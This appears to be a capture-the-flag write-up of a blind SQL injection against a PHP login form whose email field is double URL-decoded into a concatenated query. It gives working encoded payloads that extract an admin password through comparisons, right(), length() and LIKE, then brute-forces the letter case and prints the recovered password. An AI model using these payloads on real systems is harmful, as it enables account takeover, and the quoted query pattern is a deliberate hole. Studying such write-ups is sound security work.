I found that the email in the proxy is vulnerable to SQLi by inserting a `'` and then I got a 500:
```
email=a'@a.com&password=a
```
Note: the email has a specific regex to meet. 
After insepcting the source code, I found one may cause a race condition where 2 users with the same email are registered. 
I found theres double decoding:
```php
$sql = "SELECT id FROM users WHERE email = '" . urldecode($email) . "';";
```
Therefore, I can insert any encoded code there since numbers and percent signs are valid for the username part of an email in FILTER_VALIDATE_EMAIL. However the limit is that (after the first encoding) it must be at most 40 characters. 
A nice trick is that, to type space one needs only 1 character (`+`) instead of `%20` since they decode the same.  

After some more snooping around I found this query to leak the first character of a password of 
ID=1:
```sql
'+or+id=1+and+password%3c'Maaaa'--+@a.a

-- decoded

' or id=1 and password<'Maaaa'-- @a.a
```
which basically checks the id is equal to 1 and therefore can reveal the first 5 letters of the password.  But over that, I need 11 more characters. Assuming no other  If I omit the clause: `or id =1` then I can now discover 14 letters and the rest I brute-force but it didn't work.
I then used the following payload:
```sql
'+or+right%28password%2c1%29='c'--+@a.a

decodes:

' or right(password,1)='c'-- @a.a
```
and brute force. However, both `v` and `V` resulted in TRUE. After further inspection I found that `<` with strings is also case insensitive. Using regexp I found that the last letter - 1 is:
```
7
```
therefore I could conclude it is some case (sensitive) of the following:
```
KxH6MEIOODA2K47v
```
All in all, there were 12 letters and therefore, `4096` options. I brute forced it and still, no answer.
I then literally checked and this both were true:
```
' or length(password)=16-- @a.a
' or password like 'KxH6MEIOOD%'-- @a.a
' or password like '%IOODA2K47v'-- @a.a
```
So it literally means: 
It is 16 characters long, It starts with `KxH6MEIOOD` and ends with `IOODA2K47v`.
Therefore it must be 
```
KxH6MEIOOD------ (16 chars)
------IOODA2K47v (16 chars)
KxH6MEIOODA2K47v
```
I then brute forced again, this time, I proxied everything and then searched manually for location header. To my surprise, I found a request with the password which had the password `kXH6meIoODA2K47v`. I tried it manually, and it worked!
Now the reason I didn't find it using my python script is that the requests library follows redirects, therefore, on successful login, it would follow the redirect and this check would always fail:
```python
@override
def evaluate_response_value(self, response: requests.Response) -> bool:
	return response.ok and 'Location' in response.headers
```

